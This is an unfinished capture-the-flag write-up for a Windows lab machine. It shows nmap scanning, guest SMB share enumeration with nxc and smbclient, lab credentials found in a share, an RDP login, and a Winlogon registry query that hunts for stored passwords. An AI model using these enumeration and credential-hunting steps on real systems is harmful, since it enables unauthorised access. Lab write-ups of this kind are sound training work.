# Windows Jump Challange - Writeup

The challenge provides the following ip adresse:

```
ip adress: 10.114.180.136
```

## start with reconaissaince
```bash
nmap -sV -sC -T5 10.114.180.136
```


Lets try to coonect with smb with guest crdentials

`nxc smb 10.114.180.136 -u 'guest' -p ''`
```
SMB         10.114.180.136  445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:None)
SMB         10.114.180.136  445    PRIVESC          [+] privesc\guest: 
```

We see that we can connect via **smb**

Lets look into the shares if there is something interesting 

`nxc smb 10.114.180.136 -u 'guest' -p '' --shares`

```
SMB         10.114.180.136  445    PRIVESC          Share           Permissions     Remark
SMB         10.114.180.136  445    PRIVESC          -----           -----------     ------
SMB         10.114.180.136  445    PRIVESC          ADMIN$                          Remote Admin
SMB         10.114.180.136  445    PRIVESC          C$                              Default share
SMB         10.114.180.136  445    PRIVESC          IPC$            READ            Remote IPC
SMB         10.114.180.136  445    PRIVESC          Public          READ            Public file share
```

Using smbclient to connect with the readable share

smbclient //10.114.180.136/Public -N 

get welcome.txt



Get Credentials
```
Username : thmuser
Password : Password1!
```

Connect via rdp 

`xfreerdp /v:10.114.180.136 /u:thmuser /p:'Password1!' /cert:ignore 
`


reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"